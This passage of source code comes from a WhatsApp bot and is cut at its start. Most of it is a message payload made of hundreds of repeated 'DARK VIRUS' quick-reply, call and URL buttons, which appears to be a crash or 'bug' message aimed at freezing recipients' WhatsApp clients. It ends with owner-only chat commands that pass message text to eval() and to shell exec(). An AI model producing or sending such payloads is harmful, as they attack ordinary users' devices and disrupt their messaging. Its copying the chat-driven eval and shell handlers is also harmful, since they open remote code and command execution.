{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
  { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
  { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quoted: lep }
]})}
await sleep(ms(waktu))
break
//=============================================================================================================
}
if (budy.startsWith('=>')) {
if (!ItsukaAllanBae) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return itsuka.reply(bang)
}
try {
itsuka.reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
} catch (e) {
itsuka.reply(String(e))
}
}
//=============================================================================================================
if (budy.startsWith('>')) {
if (!khususOwner) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await itsuka.reply(evaled)
} catch (err) {
    itsuka.reply(String(err))
}
}
//=============================================================================================================
if (budy.startsWith('<')) {
if (!khususOwner) return
try {
return itsuka.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
//=============================================================================================================
if (budy.startsWith('$')){
if (!khususOwner) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return itsuka.reply(`${err}`)
if (stdout) {
    itsuka.reply(stdout)
}
})
}
} catch (err) {
    itsuka.reply(util.format(err))
}
} 
//=============================================================================================================